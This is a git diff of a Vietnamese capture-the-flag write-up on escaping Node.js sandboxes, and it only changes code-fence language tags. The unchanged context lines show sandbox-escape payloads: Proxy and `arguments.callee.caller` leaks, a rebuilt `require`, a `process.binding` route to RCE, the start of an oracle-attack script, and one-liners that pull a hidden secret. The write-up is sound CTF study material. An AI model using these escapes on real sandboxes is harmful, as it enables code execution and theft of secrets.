@@ -29,7 +29,7 @@ Có thể nói đây là một nodejs sandbox dùng worker thread để chạy e
 })
 ```
 khi throw Exception thì attribute `stack` của exception sẽ được access, từ đó `get` của proxy sẽ được trigger và ta có thể leak được external object thông qua `arguments.callee.caller`. Ở đây thì `require` đã bị thay thế như bên trên đề cập, `globalThis.process` cũng bị set về null nhưng `globalThis.module` thì vẫn còn, ta có thể invoke tới `globalThis.module.constructor.createRequire` để tạo lại function `require`.
-```
+```javascript
 1});(() => { throw new Proxy({}, {
   get: function(me, key) {
          const cc = arguments.callee.caller;
@@ -54,7 +54,7 @@ Nhìn lại code của đề:
 ![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/152a2cf5-01da-4d94-895c-b000753864fc)
 
 Không rõ là vô tình hay cố ý nhưng việc set `process.env` thành null khiến cho ta không thể invoke `exec` của `child_process` được nữa. Một fact đó là `globalThis.process` thật ra là một module và được nodejs auto expose ra, ta có thể chủ động import lại module này bằng cách `require("process")`, ở đây ta có thể đơn giản là set `process.env = {}` để không gặp lỗi khi chạy `child_process` nữa, cách của mình thì lại lợi dụng `process.binding` để truy cập đến các low level API của nodejs, cụ thể là `spawn_sync` để RCE
-```js
+```javascript
 1});(() => { throw new Proxy({}, {
   get: function(me, key) {
          const cc = arguments.callee.caller;
@@ -69,7 +69,7 @@ Không rõ là vô tình hay cố ý nhưng việc set `process.env` thành null
 ![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/22a895ca-6fa1-4f10-95f2-a8264ce4c7d0)
 
 Thực chất ta có thể exfiltrate biến `flag`, nhưng flag thật thì nằm ở `secret`, code để oracle attack biến `flag`:
-```
+```py
 import requests
 import string
 
@@ -104,7 +104,7 @@ Vì có `revenge` trong tên nên hẳn là context bài này giống bài cũ, 
 
 Dùng tính năng prettier của chrome để beautify lại cái js cho tiện
 
-```js
+```javascript
 const vm = require('vm');
 function generateScript(a, b) {
     fixBytecode(a);
@@ -170,7 +170,7 @@ Bị lỗi, nhìn lại vào source `worker.js` ta thấy `runBytecodeFile("./ut
 
 Lỗi khác được trả về, tới đây thì stuck một lúc, mình suy đoán là có thể nó đang thao tác gì đó với `globalThis.storage` nên mình thử thêm vào
 
-```js
+```javascript
 const { runBytecodeFile } = require("./bytecode.js")
 
 globalThis.require = require;
@@ -227,7 +227,7 @@ Tìm thấy đoạn nó thao tác với symbol `nodejs.util.inspect.custom`
 
 Chưa có thông tin gì nhiều lắm, nhưng với 2 dữ kiện là import `util` và truy cập vào symbol `nodejs.util.inspect.custom` thì có thể `globalThis.storage` đang chứa gì đó, tới đây mình quyết định debug v8 của nodejs
 
-```js
+```javascript
 const { runBytecodeFile } = require("./bytecode.js")
 
 globalThis.require = require;
@@ -328,7 +328,7 @@ Nếu sai thì jump đến `+28`, tại đây như ban đầu ta biết `a1` là
 
 Vậy có vẻ nhánh ta cần vào là lúc `depth` == `Infinity`, cùng thử xem sao
 
-```js
+```javascript
 const { runBytecodeFile } = require("./bytecode.js")
 
 globalThis.require = require;
@@ -555,7 +555,7 @@ Cách bypass của tác giả đó là override lại method `startsWith` luôn 
 
 ![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/11a65428-364c-4149-8705-16f22f992788)
 
-```js
+```javascript
 (function(){return ({ toJSON: function() {k = arguments.callee.caller.constructor(`String.prototype.startsWith = () => false;return JSON.stringify([...globalThis.secureRequire(\"util\").inspect(globalThis.storage, {customInspect: true, depth: Infinity})])`)()}, toString: () => k })})()
 ```
 
@@ -574,7 +574,7 @@ node --stack-size=10000000 test.js
 
 Flag hiện ra rồi, vậy là do đệ quy quá nhiều lần exceeds default stack-size. Đến đây thì mình bí rồi, mình xem thử cách làm của author
 
-```js
+```javascript
 (()=>{const a=new Error;a.name={toString:new Proxy(()=>{},{apply(a,b,c){throw c.constructor.constructor("String.prototype.startsWith = (s, p) => { return false; };return [...secureRequire('util').inspect(globalThis.storage, {customInspect: true, depth: Infinity})]")()}})};try{a.stack}catch(a){return a}})();
 ```
 
@@ -583,7 +583,7 @@ Flag hiện ra rồi, vậy là do đệ quy quá nhiều lần exceeds default 
 UPDATE: thật ra đây là vấn đề của thằng burpsuite cơ, payload mình oke =))) đm burpsuite, me go for postman
 
 ### Unintendeds
-```js
+```javascript
 (function(){return ({ toJSON: function() {k = arguments.callee.caller.constructor(`globalThis.storage.__defineGetter__('p', function(){ return this.secret });return btoa(globalThis.storage.p);`)()}, toString: () => k })})()
 ```
 
@@ -591,7 +591,7 @@ Vì getter sẽ được invoke sau khi Proxy handle xong, nếu thời điểm 
 
 ![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/7fb75684-b37b-4afd-ae41-f94c778d3543)
 
-```js
+```javascript
 new Proxy(_=>_ , {
     get: new Proxy(_=>_ , {
       apply: function(target, thisArg, argumentsList) {
